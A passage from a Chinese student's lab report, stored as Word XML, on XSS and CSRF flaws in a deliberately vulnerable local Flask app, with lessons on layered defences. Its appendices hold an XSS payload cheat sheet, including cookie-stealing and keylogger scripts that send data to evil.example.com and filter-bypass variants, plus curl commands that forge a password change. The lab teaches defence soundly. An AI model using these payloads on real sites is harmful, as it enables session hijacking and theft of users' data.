        <w:t>通过本次实验，我对XSS和CSRF这两种Web安全漏洞有了从理论到实践的完整认识：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber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XSS攻击的危害比表面看起来大得多</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> —— 一开始我觉得"弹个窗而已有什么大不了"，但实际操作后发现XSS能做的事情远不止弹窗。它能窃取Cookie、劫持会话、篡改页面内容，甚至配合CSRF完成更复杂的攻击链。留言板的存储型XSS更危险，因为恶意的脚本会被持久存储，每一个打开页面的用户都会中招。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber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CSRF是一种"借刀杀人"的攻击方式</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> —— 攻击者不需要直接入侵服务器，也无需获取用户的密码，只需要诱导用户点击一个链接，就能以用户的身份执行敏感操作。修改密码的实验让我深刻认识到：如果只有登录态的检查而没有CSRF Token，任何"看起来是本人操作"的请求都可能是伪造的。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber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`| safe` 过滤器是一把双刃剑</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> —— 在Jinja2模板中，为了提高灵活性允许信任的内容不做转义，但如果这个"信任"被滥用，把用户输入也标记为safe，就等于给了攻击者直接在页面中执行任意代码的权限。默认的HTML转义是安全的第一道屏障，移除它之前一定要确认数据来源可信。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber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XSS和CSRF经常组合出现</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> —— XSS可以在目标域名下执行JavaScript，绕过了浏览器的同源策略对JavaScript的限制。有了这个能力，攻击者就可以直接对同源的接口发起CSRF攻击。而且因为JavaScript是在目标域名上下文中执行的，它可以先读取页面内容获取CSRF Token（如果页面上有的话），然后再发送"合法"的请求——这种情况下仅靠CSRF Token是不够的，必须从源头解决XSS。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber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防御是分层的，不能只靠一种手段</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> —— 输出编码解决XSS的脚本执行问题，CSRF Token解决请求伪造问题，HttpOnly降低Cookie被盗的损失，CSP从浏览器层面兜底。每一层防护各司其职，多层叠加才能构成完整的防御体系。单一防护措施的失效不应该导致整个系统沦陷。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>安全意识要贯穿开发和测试的每个环节</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> —— 在写代码的时候就要思考：用户输入的数据最终会显示在哪里？有没有 `| safe`？修改密码的接口有没有验证Token？这些问题不应该等到安全测试的时候才去想，而应该成为写每一行代码时的习惯。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>十、项目文件清单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Day7/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app.py                              # Flask 主程序（含XSS/CSRF漏洞 + 密码修改功能）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data/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└── .gitkeep                        # 数据库目录占位文件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pages/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└── help.html                       # 帮助中心页面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templates/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base.html                       # 基础模板（导航栏新增反馈入口）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index.html                      # 首页（新增留言板、反馈回显、搜索回显）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login.html                      # 登录页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register.html                   # 注册页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├── upload.html                     # 文件上传页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└── profile.html                    # 个人中心（新增修改密码表单，含CSRF漏洞）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static/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└── css/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│       └── style.css                   # 样式文件（新增留言板、反馈样式）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├── Day7-XSS与CSRF漏洞实验报告-敬君琳.md   # 实验报告（Markdown版本）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└── Day7-XSS与CSRF漏洞实验报告-敬君琳.docx  # 实验报告（Word版本）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>启动方式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cd Day7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python app.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>访问 http://localhost:5000 ，预设登录账号 `admin / admin123` 和 `alice / alice2025`。</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>附录A：XSS攻击Payload速查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基础弹窗测试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&lt;script&gt;alert('XSS')&lt;/script&gt;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IMG标签事件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&lt;img src=x onerror=alert('XSS')&gt;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onload事件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&lt;body onload=alert('XSS')&gt;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SVG事件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&lt;svg onload=alert('XSS')&gt;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Cookie窃取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&lt;script&gt;new Image().src='http://evil.example.com/steal?c='+document.cookie&lt;/script&gt;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页面重定向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&lt;script&gt;window.location='http://evil.example.com'&lt;/script&gt;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页面篡改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&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Hacked&lt;/h1&gt;'&lt;/script&gt;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键盘记录器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document.onkeypress=function(e){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  new Image().src='http://evil.example.com/keys?k='+e.key;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&lt;/script&gt;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绕过简单过滤：大小写混用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&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;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&lt;!-- 绕过简单过滤：嵌套 --&gt;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&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;/script&gt;ipt&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>附录B：CSRF攻击测试命令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使用curl模拟CSRF攻击（需替换为实际的Cookie值）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1. 获取登录后的Cookie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curl -c cookies.txt -X POST "http://127.0.0.1:5000/login" \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-d "username=alice&amp;password=alice2025"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2. 使用获取的Cookie修改admin的密码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curl -b cookies.txt -X POST "http://127.0.0.1:5000/change-password" \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-d "username=admin&amp;new_password=hacked123"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3. 验证：使用新密码登录admin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curl -c cookies2.txt -X POST "http://127.0.0.1:5000/login" \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 xml:space="preserve">  -d "username=admin&amp;password=hacked123"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8"/>
        </w:rPr>
        <w:t># 如果登录成功，说明CSRF攻击成功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